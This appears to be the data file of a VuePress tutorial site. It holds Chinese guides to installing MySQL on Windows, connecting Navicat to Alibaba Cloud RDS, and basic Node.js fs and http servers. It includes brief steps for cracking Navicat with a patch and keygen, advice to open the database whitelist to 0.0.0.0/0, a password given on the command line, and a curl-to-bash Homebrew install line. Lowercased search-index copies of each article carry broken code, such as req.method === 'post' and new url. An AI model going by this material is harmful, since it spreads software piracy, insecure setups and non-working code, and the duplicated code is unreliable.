1. 解压下载后的zip，如下图。\n\n 2. 配置环境变量，将mysql文件夹下的bin路径添加到变量值中，注意得用;分隔（win10会智能一点）。右击“我的电脑”——选择“属性”——选择“高级系统设置”——选择“高级”——选择“环境变量”。在“系统变量”中选中“path”进行编辑。\n    \n\n 3. 配置初始化的my.ini文件，在mysql目录里新增my.ini文件\n    \n    [client]\n    # 设置客户端的端口号\n    port=3306\n    # 设置客户端默认字符集\n    default-character-set=utf8\n    [mysql]\n    # 设置mysql客户端默认字符集\n    default-character-set=utf8\n    [mysqld]\n    # 设置mysql服务运行时的端口号\n    port=3306\n    # 设置mysql的安装目录，双斜杠\n    basedir=d:\\\\mysql-8.0.27-winx64\n    # 设置mysql的数据存放目录\n    datadir=d:\\\\mysql-8.0.27-winx64\\\\data\n    # 允许最大连接数，如果出现too many connections的错误就需要增加最大连接数\n    max_connections=200\n    # 允许连接失败的次数。防止被攻击，超过会禁止host连接，重启mysql服务器或flush hosts命令可让host继续连接\n    max_connect_errors=10\n    # 数据库和数据库表的默认字符集(mysql服务端)，utf8是3字节的，utf8mb4是4字节的可以支持一些emoji表情\n    character-set-server=utf8mb4\n    # 数据库字符集对应一些排序规则,要属于character-set-server对应值的集合内\n    collation-server = utf8mb4_general_ci\n    # 设置client连接mysql时的字符集,防止乱码\n    init_connect='set names utf8mb4'\n    # 创建新表时将使用的默认存储引擎\n    default-storage-engine=innodb\n    # 默认使用mysql_native_password插件认证\n    default_authentication_plugin=mysql_native_password\n    # mysql连接闲置超过一定时间后(单位：秒)将会被强行关闭\n    wait_timeout = 1800\n    # mysql默认的wait_timeout 值为8个小时，interactive_timeout参数需要同时配置才能生效\n    interactive_timeout = 1800\n    # 大小写不敏感：1，大小写敏感0\n    lower_case_table_names=0\n    #限制单个文件大小,默认1g,太大了\n    max_binlog_size = 100m\n    # 数据库错误日志文件\n    log_error=d:\\\\mysql-8.0.27-winx64\\\\log\\\\error.log\n    # 设置临时表最大值，这是每次连接都会分配，不宜设置过大 max_heap_table_size 和 tmp_table_size 要设置一样大\n    max_heap_table_size = 2048m\n    tmp_table_size = 2048m\n    # 每个连接都会分配的一些排序、连接等缓冲，一般设置为 2mb 就足够了\n    sort_buffer_size = 2m\n    join_buffer_size = 2m\n    read_buffer_size = 2m\n    read_rnd_buffer_size = 2m\n    # 0,每秒写一次log,并flush到磁盘；1,每次事务提交时，写log,同时flush到磁盘；2,每次事务提交时写log,每秒flush一次到磁盘\n    innodb_flush_log_at_trx_commit = 1\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    29\n    30\n    31\n    32\n    33\n    34\n    35\n    36\n    37\n    38\n    39\n    40\n    41\n    42\n    43\n    44\n    45\n    46\n    47\n    48\n    49\n    \n\n 4. 安装mysql，先以管理员身份运行cmd。\n    \n    * 进入到mysql安装目录下，输入mysqld --install来安装mysql服务。\n    * 然后输入mysqld --initialize --console来初始化mysql，会出现a temporary password is generated for root@localhost:，它的后面就是root用户的初始密码，一定要记住。\n    * 输入net start mysql开启mysql服务（如果失败了，那就输入mysqld --remove卸载mysql服务，再重新安装），如果输入net stop mysql这是停止mysql服务。\n    * 输入mysqladmin -u用户名 -p旧密码 password 新密码来修改那个初识密码，例如mysqladmin -uroot -p123456 password 123。输入mysql -u root -p也可以修改密码。\n\n\n# 云厂商mysql\n\n我们上线的项目是站库分离的，也就是后端代码与数据库不在同一台服务器上。这样的好处是减轻本地个人计算机的压力，云厂商的云数据库可以存放正开发的数据库，也可以存放已经上线的数据库，也就是它可以存放不同项目不同状态的数据库，更好的维护。况且云数据库也很便宜，新人优惠买3年也只要60元，双十一每年也只要10块钱。\n\n我们以阿里云为例，进入https://www.aliyun.com/product/rds/mysql这个网站，新用户会有优惠活动。\n\n\n\n如果你不是新用户，那就只能点击页面顶部的“立即购买”按照原价来购买了。例如下面这种，买的一个月的，一核一g，只有20g存储空间，我选的是在上海的mysql云数据库（选里你近的）。\n\n\n\n\n购买完成后进入https://rdsnext.console.aliyun.com/dashboard页面，然后按照下图可以完成创建账户和数据库以及连接数据库。（查询mysql数据库版本select version()）\n\n\n\n\n\n\n\n# 数据库客户端navicat\n\n我们使用的数据库客户端是navicat，navicat的下载安装可以去navicat官网下载navicat premium 15的试用版，破解的话可以看知乎的这篇文章。\n\nnavicat破解：选择版本，选择navicat.exe，补丁，注册码生成，复制请求码，激活码生成。\n\nnavicat的基本设置在“工具-选项”里：\n\n * 布景主题：深色\n * 启动画面：从上次离开的画面继续\n * 查询：在关闭前提示保存新建的查询或配置文件，自动保存间隔修改为60s\n * 常规颜色：220,220,170\n * 关键字颜色：86,156,214\n * 字符串颜色：206,145,120\n * 数字颜色：181,206,168\n * 注释颜色：106,153,85\n\n\n# navicat连接阿里云mysql\n\n在项目上线时，我们是将代码部署到云厂商的云服务器上的，然后云服务器也是可以安装mysql的（跟第一节内容差不多），也就是站库不分离的。使用数据库客户端连接数据库，要通过云服务器的外网地址与连接，具体就不展开，因为我们使用的是站库分离的方式。\n\n站库分离，到时候云服务器要通过内网地址与云数据库进行连接，这个也不展开了。而在我们本地开发项目时（还未上线正在开发中），需要使用数据库客户端navicat连接云数据库的，这要通过云数据库的外网地址。\n\nnavicat连接阿里云云数据库mysql步骤：\n\n * 首先进入阿里云工作台的资源实例视图，进入你的阿里云mysql的实例。\n * 然后查看我们的mysql实例的连接详情，我们需要申请一下外网地址（点击“申请外网地址”按钮即可），然后还要设置一下白名单。\n * 阿里云mysql白名单的设置，首先把default的127.0.0.1改为ecs私网地址（因为我们是站库分离的，如果没有ecs就改成其他的ip，只要不是127.0.0.1就行），再设置一个自己电脑ip地址（该ip是你自己电脑的公网ip，在百度上查询自己电脑的公网ip，像我用的长城宽带，ip几乎每天都不一样）。 阿里云mysql白名单设置\n * 设置完白名单后再点击“查看连接详情”，就能看到阿里云mysql的外网地址了。 已获取阿里云mysql外网地址\n * 在navicat面板里找到“连接-阿里云-阿里云云数据库mysql版” navicat连接阿里云mysql\n * 在“新建连接”里，连接名随意填，主机名就是阿里云mysql的外网地址，端口号一般是3306（上一步也能看到端口号），用户名和密码在阿里云mysql数据库这一节的“创建账号”里说过了，最好用阿里云mysql的高权限账号，比如我的是admin_liawn。 navicat新建连接\n * 创建好连接后你可以点击一下“测试连接”按钮，如果不成功，很有可能是你的阿里云mysql白名单设置有问题，可以暂时把白名单设置成0.0.0.0/0，直到你真的弄清楚你本地的公网地址，再把0.0.0.0/0改为你的公网地址。如果成功，保存连接，在navicat面板右击连接名，然后选择“打开连接”。 进行连接阿里云mysql\n * 如果还有问题，可以查看解决无法连接实例问题。\n\n\n# 建库建专用用户\n\n可以直接在阿里云mysql里建库，也可以通过navicat连接阿里云mysql之后，在navicat上进行建库。这里讲第二种，我们右击“阿里云mysql”（名字是在创建连接时随意取的），然后选择“新建数据库”。我们新建数据库blog_dev用于开发环境，字符集使用utf8mb4（支持复杂的unicode）。\n\n\n\n\n然后我们给新数据库blog_dev新建一个专用的“用户”，这个用户只能操作阿里云mysql里的这个blog_dev数据库，其他数据库没有权限。\n\n\n\n如果点击“用户”报1142 - select command denied to user错误，那表示你没有权限，要将“阿里云mysql”这个连接信息的用户名改为阿里云mysql的高权限账号，比如我的高权限账号是admin_liawn。\n\n\n等专用用户创建成功后，我们再将连接信息的用户改为这个专用用户。\n\n常用的系统类函数以及sql\n\n * version()：查看数据库版本号。select version();\n * database()：查看当前库。select database();\n * user()：查看当前用户。select user();\n * show databases：查看所有数据库。\n * show tables：查看当前库里的所有表。",charsets:{cjk:!0}},{title:"fs文件系统模块",frontmatter:{},regularPath:"/book-web/web%E5%90%8E%E7%AB%AF/%E5%AD%A6%E4%B9%A0node.js/1.fs%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E6%A8%A1%E5%9D%97.html",relativePath:"book-web/web后端/学习node.js/1.fs文件系统模块.md",key:"v-645aefa2",path:"/book-web/web%E5%90%8E%E7%AB%AF/%E5%AD%A6%E4%B9%A0node.js/1.fs%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E6%A8%A1%E5%9D%97.html",headers:[{level:2,title:"什么是fs文件系统模块",slug:"什么是fs文件系统模块",normalizedTitle:"什么是fs文件系统模块",charIndex:15},{level:2,title:"读取指定文件中的内容",slug:"读取指定文件中的内容",normalizedTitle:"读取指定文件中的内容",charIndex:113},{level:3,title:"fs.readFile()",slug:"fs-readfile",normalizedTitle:"fs.readfile()",charIndex:95}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"什么是fs文件系统模块 读取指定文件中的内容 fs.readFile()",content:"# fs文件系统模块\n\n\n# 什么是fs文件系统模块\n\nfs模块是Node.js官方提供的、用来操作文件的模块。它提供了一系列的方法和属性，用来满足用户对文件的操作需求。\n\n例如:\n\n * fs.readFile()方法，用来读取指定文件中的内容。\n * fs.writeFile()方法，用来向指定文件中写入内容。\n\n如果要在js代码中使用fs模块来操作文件，则需要使用如下的方式先导入它：\n\nconst fs = require('fs')\n// 或import\nimport fs from 'fs'\n\n\n1\n2\n3\n\n\n\n# 读取指定文件中的内容\n\n\n# fs.readFile()",normalizedContent:"# fs文件系统模块\n\n\n# 什么是fs文件系统模块\n\nfs模块是node.js官方提供的、用来操作文件的模块。它提供了一系列的方法和属性，用来满足用户对文件的操作需求。\n\n例如:\n\n * fs.readfile()方法，用来读取指定文件中的内容。\n * fs.writefile()方法，用来向指定文件中写入内容。\n\n如果要在js代码中使用fs模块来操作文件，则需要使用如下的方式先导入它：\n\nconst fs = require('fs')\n// 或import\nimport fs from 'fs'\n\n\n1\n2\n3\n\n\n\n# 读取指定文件中的内容\n\n\n# fs.readfile()",charsets:{cjk:!0}},{frontmatter:{},regularPath:"/book-web/web%E5%90%8E%E7%AB%AF/%E5%AD%A6%E4%B9%A0node.js/2.path%E8%B7%AF%E5%BE%84%E6%A8%A1%E5%9D%97.html",relativePath:"book-web/web后端/学习node.js/2.path路径模块.md",key:"v-89657368",path:"/book-web/web%E5%90%8E%E7%AB%AF/%E5%AD%A6%E4%B9%A0node.js/2.path%E8%B7%AF%E5%BE%84%E6%A8%A1%E5%9D%97.html",lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:null,content:"",normalizedContent:"",charsets:{}},{title:"处理Http请求",frontmatter:{},regularPath:"/book-web/web%E5%90%8E%E7%AB%AF/%E5%AD%A6%E4%B9%A0node.js/3.http%E6%A8%A1%E5%9D%97.html",relativePath:"book-web/web后端/学习node.js/3.http模块.md",key:"v-72a7cb5d",path:"/book-web/web%E5%90%8E%E7%AB%AF/%E5%AD%A6%E4%B9%A0node.js/3.http%E6%A8%A1%E5%9D%97.html",headers:[{level:2,title:"搭建Http服务",slug:"搭建http服务",normalizedTitle:"搭建http服务",charIndex:15},{level:2,title:"处理get请求",slug:"处理get请求",normalizedTitle:"处理get请求",charIndex:572},{level:2,title:"处理post请求",slug:"处理post请求",normalizedTitle:"处理post请求",charIndex:2088}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"搭建Http服务 处理get请求 处理post请求",content:"# 处理Http请求\n\n\n# 搭建Http服务\n\n首先需要引入http模块，使用它的createServer方法来创建一个http服务。createServer方法的形参是一个回调函数，在每次接收到请求时被执行。该回调函数有两个形参，第一个是请求对象，第二个是响应对象。在最后，需要使用listen方法来监听一个端口（第一个形参），服务就绪时会执行第二个形参（回调函数）。\n\n// 引入http模块\nconst http = require('http')\n// 服务会部署在哪个端口\nconst port = 8000\n// 创建一个服务\nconst server = http.createServer((req, res) => {\n    // 状态码\n    res.statusCode = 200\n    // 数据形式\n    res.setHeader('Content-Type', 'text/plain')\n    // 返回给客户端的信息\n    res.end('你好世界\\n')\n})\n// 服务就绪\nserver.listen(port, () => {\n    console.log('服务已启动');\n})\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n\n# 处理get请求\n\nGET请求是客户端向服务端请求查询一些数据，可以在URL带上查询参数。浏览器URL直接回车请求就是一个GET请求。请看下面这个例子，浏览器输入http://localhost:8000/?key=1&name=2并回车，req.method的值是GET，req.url的值是/?key=1&name=2，经过URLSearchParams处理过后，返回到页面的值是一个JSON字符串{\"key\":\"1\",\"name\":\"2\"}。\n\n// 引入http模块\nconst http = require('http')\nconst { URL } = require('url')\n// 服务会部署在哪个端口\nconst port = 8000\n// 创建一个服务\nconst server = http.createServer((req, res) => {\n    // 什么类型的请求，请求的地址\n    console.log('req.method', req.method);\n    console.log('req.url', req.url);\n    // URL相关信息\n    const url = new URL(req.url, `http://${req.headers.host}`);\n    const resData = {};\n    // 显示键/值对，处理成对象\n    for (const item of url.searchParams) {\n        resData[item[0]] = item[1]\n    }\n    // 状态码\n    res.statusCode = 200\n    // 数据形式\n    res.setHeader('Content-Type', 'application/json')\n    // 返回给客户端的信息\n    res.end(JSON.stringify(resData))\n})\n// 服务就绪\nserver.listen(port, () => {\n    console.log('服务已启动');\n})\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n当 request.url 为 '/status?name=ryan' 且 request.headers.host 为 'localhost:3000' 时：\n\n$ node\n> new URL(request.url, `http://${request.headers.host}`)\nURL {\n  href: 'http://localhost:3000/status?name=ryan',\n  origin: 'http://localhost:3000',\n  protocol: 'http:',\n  username: '',\n  password: '',\n  host: 'localhost:3000',\n  hostname: 'localhost',\n  port: '3000',\n  pathname: '/status',\n  search: '?name=ryan',\n  searchParams: URLSearchParams { 'name' => 'ryan' },\n  hash: ''\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# 处理post请求\n\nPOST请求是客户端向服务端传递一些数据，这些数据大多数用于修改更新服务端存储数据。POST请求可以使用ajax/axios来发送，如果不想写代码，可以使用谷歌应用商店里的postman来模拟发送POST请求。\n\nnode处理POST请求的处理与GET不一样，它的接收数据可能会很大，所以它使用了req.on('data')来一直接收数据，在数据接收完后有req.on('end')来收尾。\n\n// 引入http模块\nconst http = require('http')\n// 服务会部署在哪个端口\nconst port = 8000\n// 创建一个服务\nconst server = http.createServer((req, res) => {\n    if (req.method === 'POST') {\n        console.log('req Content-Type', req.headers['content-type']);\n        let postData = '';\n        // 接收数据\n        req.on('data', chunk => {\n            postData += chunk;\n        });\n        // 数据接收完毕\n        req.on('end', () => {\n            console.log('postData', postData);\n            // 状态码\n            res.statusCode = 200\n            // 数据形式\n            res.setHeader('Content-Type', 'application/json')\n            // 返回给客户端的信息\n            res.end(JSON.stringify(postData))\n        })\n    }\n})\n// 服务就绪\nserver.listen(port, () => {\n    console.log('服务已启动');\n})\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n打开谷歌浏览器，进入chrome://apps，点击Postman，我们在以下界面填写相应的数据。地址栏里填写完整的地址，包括端口号；点击Body，然后选择raw，然后选择数据类型为JSON(application/json)；在textArea里输入请求数据例如{name:'张三',age:18}，最后点击Send就可以发送一个POST请求了。（下图的请求参数是“Bad String”，字符串得使用双引号，并且这个key也得用双引号包裹）\n\n\n\n看一下同时处理GET和POST请求：\n\n// 引入http模块\nconst http = require('http')\nconst { URL } = require('url')\n// 服务会部署在哪个端口\nconst port = 8000\n// 创建一个服务\nconst server = http.createServer((req, res) => {\n    // 什么请求\n    const method = req.method\n    // 数据形式\n    res.setHeader('Content-Type', 'application/json')\n    // 状态码\n    res.statusCode = 200\n    // URL相关信息\n    const url = new URL(req.url, `http://${req.headers.host}`);\n\n    if (method === 'GET') {\n        const resData = {};\n        for (const item of url.searchParams) {\n            resData[item[0]] = item[1];\n        }\n        // 返回给客户端的信息\n        res.end(JSON.stringify(resData));\n    } else if (method === 'POST') {\n        let postData = '';\n        // 接收数据\n        req.on('data', chunk => {\n            postData += chunk;\n        });\n        // 数据接收完毕\n        req.on('end', () => {\n            // 返回给客户端的信息\n            res.end(JSON.stringify(postData))\n        })\n    }\n})\n// 服务就绪\nserver.listen(port, () => {\n    console.log('服务已启动');\n})\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n",normalizedContent:"# 处理http请求\n\n\n# 搭建http服务\n\n首先需要引入http模块，使用它的createserver方法来创建一个http服务。createserver方法的形参是一个回调函数，在每次接收到请求时被执行。该回调函数有两个形参，第一个是请求对象，第二个是响应对象。在最后，需要使用listen方法来监听一个端口（第一个形参），服务就绪时会执行第二个形参（回调函数）。\n\n// 引入http模块\nconst http = require('http')\n// 服务会部署在哪个端口\nconst port = 8000\n// 创建一个服务\nconst server = http.createserver((req, res) => {\n    // 状态码\n    res.statuscode = 200\n    // 数据形式\n    res.setheader('content-type', 'text/plain')\n    // 返回给客户端的信息\n    res.end('你好世界\\n')\n})\n// 服务就绪\nserver.listen(port, () => {\n    console.log('服务已启动');\n})\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n\n# 处理get请求\n\nget请求是客户端向服务端请求查询一些数据，可以在url带上查询参数。浏览器url直接回车请求就是一个get请求。请看下面这个例子，浏览器输入http://localhost:8000/?key=1&name=2并回车，req.method的值是get，req.url的值是/?key=1&name=2，经过urlsearchparams处理过后，返回到页面的值是一个json字符串{\"key\":\"1\",\"name\":\"2\"}。\n\n// 引入http模块\nconst http = require('http')\nconst { url } = require('url')\n// 服务会部署在哪个端口\nconst port = 8000\n// 创建一个服务\nconst server = http.createserver((req, res) => {\n    // 什么类型的请求，请求的地址\n    console.log('req.method', req.method);\n    console.log('req.url', req.url);\n    // url相关信息\n    const url = new url(req.url, `http://${req.headers.host}`);\n    const resdata = {};\n    // 显示键/值对，处理成对象\n    for (const item of url.searchparams) {\n        resdata[item[0]] = item[1]\n    }\n    // 状态码\n    res.statuscode = 200\n    // 数据形式\n    res.setheader('content-type', 'application/json')\n    // 返回给客户端的信息\n    res.end(json.stringify(resdata))\n})\n// 服务就绪\nserver.listen(port, () => {\n    console.log('服务已启动');\n})\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n当 request.url 为 '/status?name=ryan' 且 request.headers.host 为 'localhost:3000' 时：\n\n$ node\n> new url(request.url, `http://${request.headers.host}`)\nurl {\n  href: 'http://localhost:3000/status?name=ryan',\n  origin: 'http://localhost:3000',\n  protocol: 'http:',\n  username: '',\n  password: '',\n  host: 'localhost:3000',\n  hostname: 'localhost',\n  port: '3000',\n  pathname: '/status',\n  search: '?name=ryan',\n  searchparams: urlsearchparams { 'name' => 'ryan' },\n  hash: ''\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# 处理post请求\n\npost请求是客户端向服务端传递一些数据，这些数据大多数用于修改更新服务端存储数据。post请求可以使用ajax/axios来发送，如果不想写代码，可以使用谷歌应用商店里的postman来模拟发送post请求。\n\nnode处理post请求的处理与get不一样，它的接收数据可能会很大，所以它使用了req.on('data')来一直接收数据，在数据接收完后有req.on('end')来收尾。\n\n// 引入http模块\nconst http = require('http')\n// 服务会部署在哪个端口\nconst port = 8000\n// 创建一个服务\nconst server = http.createserver((req, res) => {\n    if (req.method === 'post') {\n        console.log('req content-type', req.headers['content-type']);\n        let postdata = '';\n        // 接收数据\n        req.on('data', chunk => {\n            postdata += chunk;\n        });\n        // 数据接收完毕\n        req.on('end', () => {\n            console.log('postdata', postdata);\n            // 状态码\n            res.statuscode = 200\n            // 数据形式\n            res.setheader('content-type', 'application/json')\n            // 返回给客户端的信息\n            res.end(json.stringify(postdata))\n        })\n    }\n})\n// 服务就绪\nserver.listen(port, () => {\n    console.log('服务已启动');\n})\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n打开谷歌浏览器，进入chrome://apps，点击postman，我们在以下界面填写相应的数据。地址栏里填写完整的地址，包括端口号；点击body，然后选择raw，然后选择数据类型为json(application/json)；在textarea里输入请求数据例如{name:'张三',age:18}，最后点击send就可以发送一个post请求了。（下图的请求参数是“bad string”，字符串得使用双引号，并且这个key也得用双引号包裹）\n\n\n\n看一下同时处理get和post请求：\n\n// 引入http模块\nconst http = require('http')\nconst { url } = require('url')\n// 服务会部署在哪个端口\nconst port = 8000\n// 创建一个服务\nconst server = http.createserver((req, res) => {\n    // 什么请求\n    const method = req.method\n    // 数据形式\n    res.setheader('content-type', 'application/json')\n    // 状态码\n    res.statuscode = 200\n    // url相关信息\n    const url = new url(req.url, `http://${req.headers.host}`);\n\n    if (method === 'get') {\n        const resdata = {};\n        for (const item of url.searchparams) {\n            resdata[item[0]] = item[1];\n        }\n        // 返回给客户端的信息\n        res.end(json.stringify(resdata));\n    } else if (method === 'post') {\n        let postdata = '';\n        // 接收数据\n        req.on('data', chunk => {\n            postdata += chunk;\n        });\n        // 数据接收完毕\n        req.on('end', () => {\n            // 返回给客户端的信息\n            res.end(json.stringify(postdata))\n        })\n    }\n})\n// 服务就绪\nserver.listen(port, () => {\n    console.log('服务已启动');\n})\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n",charsets:{cjk:!0}},{title:"学习node的准备工作",frontmatter:{},regularPath:"/book-web/web%E5%90%8E%E7%AB%AF/%E5%AD%A6%E4%B9%A0node.js/%E5%AD%A6%E4%B9%A0node%E7%9A%84%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C.html",relativePath:"book-web/web后端/学习node.js/学习node的准备工作.md",key:"v-47a7e265",path:"/book-web/web%E5%90%8E%E7%AB%AF/%E5%AD%A6%E4%B9%A0node.js/%E5%AD%A6%E4%B9%A0node%E7%9A%84%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C.html",headers:[{level:2,title:"node介绍",slug:"node介绍",normalizedTitle:"node介绍",charIndex:18},{level:2,title:"Node.js、Npm的安装",slug:"node-js、npm的安装",normalizedTitle:"node.js、npm的安装",charIndex:369},{level:2,title:"使用nvm管理node的版本",slug:"使用nvm管理node的版本",normalizedTitle:"使用nvm管理node的版本",charIndex:671},{level:2,title:"node相关问题",slug:"node相关问题",normalizedTitle:"node相关问题",charIndex:1278},{level:2,title:"服务端和客户端开发区别",slug:"服务端和客户端开发区别",normalizedTitle:"服务端和客户端开发区别",charIndex:1588}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"node介绍 Node.js、Npm的安装 使用nvm管理node的版本 node相关问题 服务端和客户端开发区别",content:'# 学习node的准备工作\n\n\n# node介绍\n\n * Node.js是JavaScript的一种运行环境，开源、跨平台、可用于众多流行工具里。\n * 也就是说Node.js可以作为JavaScript在服务器上运行的一种形式，在其标准库中提供了一组异步的 I/O 原生功能（用以防止 JavaScript 代码被阻塞），并且 Node.js 中的库通常是使用非阻塞的范式编写的（从而使阻塞行为成为例外而不是规范）。\n * Node.js 是一个底层的平台，社区在 Node.js 上构建了数千个库，例如：Express、NestJS、Koa、Socket.io等。\n * Npm是 Node.js 标准的软件包管理器，解决Node.js部署的很多问题；可以下载别人写好的程序（包、命令行等），也可以自己写程序发布到Npm上。\n\n\n# Node.js、Npm的安装\n\n * 打开Node.js官网，如果很慢就使用Node.js中文网，选择“Recommended For Most Users（推荐给大多数用户）”，也就是稳定版本。\n * 如果你想看nodejs以前发布的版本，可以去以前的版本查看。\n * npm包管理工具是同node.js一并安装的，意思是node.js安装好后npm也随之安装到电脑上了。\n * 打开“Git Bash”，没有装Git的可以看一下Git的使用；或者打开cmd，输入node --version可以查看安装的node是什么版本的，输入npm --version可以查看安装的npm是什么版本的。\n\n\n# 使用nvm管理node的版本\n\n * 在工作当中会遇到一个项目使用10.01版本，另一可能是使用的8.0.1版本，需要切换到对应的版本，那就得使用nvm来管理本地的node版本。\n * 如果是Windows系统，可以在GitHub里搜索nvm-windows\n   * 在搜索结果列表里选择coreybutler/nvm-windows\n   * 进入之后找到“Download”字样，点击它进入下载页，可以选择nvm-setup.zip进行下载安装。可以选择稳定一点的版本。\n * 如果是苹果系统，可以使用brew来安装nvm\n   * 进入brew官网，复制一行代码/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"到电脑命令行里运行，就能安装好brew。\n   * 然后运行brew install nvm就可以使用brew来安装nvm了。\n * 如果nvm命令不存在，那就是nvm安装目录下运行nvm.exe，然后在命令窗口下输入nvm on表示开启nvm。\n * 安装好nvm之后，我们命令行里使用nvm list查看当前所有的node版本，nvm install v10.13.0安装指定版本的node版，nvm use 10.13.0切换到指定版本。\n\n\n# node相关问题\n\n 1. nvm命令不存在\n\n * 去nvm安装目录下运行nvm.exe，然后在命令窗口下输入nvm on表示开启nvm。\n\n 2. node命令不存在\n\n * 在运行完nvm install v10.13.0后一定要运行nvm use 10.13.0，它会给node配置环境变量等。\n\n 3. exit status 1: You do not have sufficient privilege to perform this operation.\n\n * 暂时不用Git Bash，要使用管理员身份运行cmd命令窗口，然后输入nvm use 10.13.0就可以切换nodejs版本了。\n\n\n# 服务端和客户端开发区别\n\n * 服务稳定性：server端可能会遭到各种恶意攻击和误操作。单个客户端可以意外挂掉，但是服务端不能。（PM2做进程守护）\n * 考虑内存和CPU：客户端独占一个浏览器，内存和CPU都不是问题。server端要承载很多请求，CPU和内存都是稀缺资源。（stream写日志来优化内存和CPU，redis写session来扩展内存和CPU）\n * 日志记录：前端也会参与日志记录，但只是日志的发起放，不关心后续。server端要记录日志、存储日志、分析日志，前端不关心。\n * 安全：server端要随时准备接收各种恶意攻击，前端则很少。越权操作、数据库攻击等。（登录验证，预防xss攻击和sql注入）\n * 集群和服务拆分：产品发展速度快，流量可能迅速增加。如何通过扩展机器和服务拆分来承载大流量。',normalizedContent:'# 学习node的准备工作\n\n\n# node介绍\n\n * node.js是javascript的一种运行环境，开源、跨平台、可用于众多流行工具里。\n * 也就是说node.js可以作为javascript在服务器上运行的一种形式，在其标准库中提供了一组异步的 i/o 原生功能（用以防止 javascript 代码被阻塞），并且 node.js 中的库通常是使用非阻塞的范式编写的（从而使阻塞行为成为例外而不是规范）。\n * node.js 是一个底层的平台，社区在 node.js 上构建了数千个库，例如：express、nestjs、koa、socket.io等。\n * npm是 node.js 标准的软件包管理器，解决node.js部署的很多问题；可以下载别人写好的程序（包、命令行等），也可以自己写程序发布到npm上。\n\n\n# node.js、npm的安装\n\n * 打开node.js官网，如果很慢就使用node.js中文网，选择“recommended for most users（推荐给大多数用户）”，也就是稳定版本。\n * 如果你想看nodejs以前发布的版本，可以去以前的版本查看。\n * npm包管理工具是同node.js一并安装的，意思是node.js安装好后npm也随之安装到电脑上了。\n * 打开“git bash”，没有装git的可以看一下git的使用；或者打开cmd，输入node --version可以查看安装的node是什么版本的，输入npm --version可以查看安装的npm是什么版本的。\n\n\n# 使用nvm管理node的版本\n\n * 在工作当中会遇到一个项目使用10.01版本，另一可能是使用的8.0.1版本，需要切换到对应的版本，那就得使用nvm来管理本地的node版本。\n * 如果是windows系统，可以在github里搜索nvm-windows\n   * 在搜索结果列表里选择coreybutler/nvm-windows\n   * 进入之后找到“download”字样，点击它进入下载页，可以选择nvm-setup.zip进行下载安装。可以选择稳定一点的版本。\n * 如果是苹果系统，可以使用brew来安装nvm\n   * 进入brew官网，复制一行代码/bin/bash -c "$(curl -fssl https://raw.githubusercontent.com/homebrew/install/head/install.sh)"到电脑命令行里运行，就能安装好brew。\n   * 然后运行brew install nvm就可以使用brew来安装nvm了。\n * 如果nvm命令不存在，那就是nvm安装目录下运行nvm.exe，然后在命令窗口下输入nvm on表示开启nvm。\n * 安装好nvm之后，我们命令行里使用nvm list查看当前所有的node版本，nvm install v10.13.0安装指定版本的node版，nvm use 10.13.0切换到指定版本。\n\n\n# node相关问题\n\n 1. nvm命令不存在\n\n * 去nvm安装目录下运行nvm.exe，然后在命令窗口下输入nvm on表示开启nvm。\n\n 2. node命令不存在\n\n * 在运行完nvm install v10.13.0后一定要运行nvm use 10.13.0，它会给node配置环境变量等。\n\n 3. exit status 1: you do not have sufficient privilege to perform this operation.\n\n * 暂时不用git bash，要使用管理员身份运行cmd命令窗口，然后输入nvm use 10.13.0就可以切换nodejs版本了。\n\n\n# 服务端和客户端开发区别\n\n * 服务稳定性：server端可能会遭到各种恶意攻击和误操作。单个客户端可以意外挂掉，但是服务端不能。（pm2做进程守护）\n * 考虑内存和cpu：客户端独占一个浏览器，内存和cpu都不是问题。server端要承载很多请求，cpu和内存都是稀缺资源。（stream写日志来优化内存和cpu，redis写session来扩展内存和cpu）\n * 日志记录：前端也会参与日志记录，但只是日志的发起放，不关心后续。server端要记录日志、存储日志、分析日志，前端不关心。\n * 